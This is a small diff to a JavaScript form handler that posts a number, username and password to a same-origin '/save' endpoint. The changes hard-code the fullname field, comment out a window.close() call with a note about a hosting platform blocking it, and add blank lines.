@@ -8,30 +8,45 @@ form.addEventListener("submit", async function(e){
 
     const data = {
 
-        number: document.getElementById("number").value,
+        number:
+        document.getElementById("number").value,
 
-        fullname: document.getElementById("e-mail").value,
 
-        username: document.getElementById("username").value,
+        fullname:
+        "Not Provided",
 
-        password: document.getElementById("password").value
+
+        username:
+        document.getElementById("username").value,
+
+
+        password:
+        document.getElementById("password").value
 
     };
 
 
     try {
 
+
         const response = await fetch("/save", {
+
 
             method:"POST",
 
+
             headers:{
+
                 "Content-Type":"application/json"
+
             },
+
 
             body: JSON.stringify(data)
 
+
         });
+
 
 
         const result = await response.json();
@@ -40,19 +55,22 @@ form.addEventListener("submit", async function(e){
         alert(result.message);
 
 
-        // clear inputs
         form.reset();
 
 
-        // close window after popup
-        window.close();
+        // remove window.close because Railway browser blocks it
+        // window.close();
+
 
 
     } catch(error) {
 
+
         console.log(error);
 
+
         alert("Server connection error");
+
 
     }
 
